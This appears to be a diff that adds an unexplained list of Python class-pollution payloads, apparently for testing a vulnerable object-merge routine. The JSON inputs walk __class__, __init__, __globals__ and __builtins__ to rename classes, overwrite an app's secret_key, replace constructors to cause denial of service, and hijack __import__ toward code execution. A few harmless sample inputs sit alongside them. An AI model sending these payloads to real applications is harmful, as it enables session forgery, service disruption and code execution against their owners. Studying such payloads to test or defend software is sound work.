@@ -1,0 +1,101 @@
+Inputs
+
+Change qualname-----------------------------------------DDOS (user){
+    "__class__":{
+        "__base__":{
+            "__qualname__":"Polluted"
+            }
+        }
+    }
+
+
+{
+    "__class__":{
+
+            "__qualname__":"Pollute2d"
+
+        }
+    }
+
+Change secret key-------------------------------------------
+ {
+    "__class__":{
+        "__init__":{
+         "__globals__":{"app": 
+{"secret_key": "new"
+
+}
+}
+            }
+        }
+    }
+--------------------------------------------------------
+
+__init__.__globals__.sys.modules.__main__.app.secret_key
+
+-------------------------DDOS change init to str_------------------
+ {
+    "__class__":{
+        "__init__": "lambda f,g: 'Bye!'"
+}
+}
+
+-------------------------^^^^^^^^^^^^^--------------------------
+----user dos---
+ {
+    "__class__":{
+	"__base__":{
+        	"__init__": "'Bye!'"
+		}
+	}
+}
+
+
+
+random 
+
+{
+    "ga":{
+
+            "wa":"da"
+
+        }
+    }
+
+{
+    "age": 26
+    }
+
+
+---------import-----------
+
+ {
+    "__class__":{
+        "__init__":{
+         "__globals__":{
+		"__builtins__":{
+			"__import__": "imp_1"
+			}
+		}
+            }
+        }
+    }
+
+
+ {
+        "__init__":{
+         "__globals__":{
+		"__builtins__":{
+			"__import__": "imp_1"
+			}
+		}
+            }
+        }
+
+
+ {
+    "__class__":{
+        "__init__":"lambda f,g: self.__class__.__init__.__globals__['__builtins__'].__import__('imp_1').test()"
+}
+}
+
